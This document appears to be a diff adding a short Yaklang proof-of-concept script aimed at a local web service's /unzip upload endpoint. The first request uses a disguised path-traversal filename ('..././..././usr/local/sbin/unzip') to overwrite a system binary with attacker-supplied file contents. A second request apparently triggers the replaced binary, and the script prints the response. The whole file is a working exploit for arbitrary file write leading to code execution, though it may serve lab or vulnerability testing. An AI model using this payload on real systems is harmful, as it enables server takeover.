@@ -1,0 +1,30 @@
+poc.HTTP(`POST /unzip HTTP/1.1
+Host: localhost:8080
+Accept: */*
+Accept-Encoding: gzip, deflate, br
+Cache-Control: no-cache
+Content-Type: multipart/form-data; boundary=--------------------------231808397611287232630018
+
+----------------------------231808397611287232630018
+Content-Disposition: form-data; name="file"; filename="..././..././usr/local/sbin/unzip"
+Content-Type: application/octet-stream
+
+{{params(file)}})}}
+----------------------------231808397611287232630018--`, poc.params({"file":file.ReadFile("./test.yak")~}),poc.host("localhost"),poc.port(8080))~
+
+
+res,req = poc.HTTP(`POST /unzip HTTP/1.1
+Host: localhost:8080
+Accept: */*
+Accept-Encoding: gzip, deflate, br
+Cache-Control: no-cache
+Content-Type: multipart/form-data; boundary=--------------------------231808397611287232630018
+
+----------------------------231808397611287232630018
+Content-Disposition: form-data; name="file"; filename="aaa"
+Content-Type: application/octet-stream
+
+aaa
+----------------------------231808397611287232630018--`, poc.host("localhost"),poc.port(8080))~
+
+println(string(res))
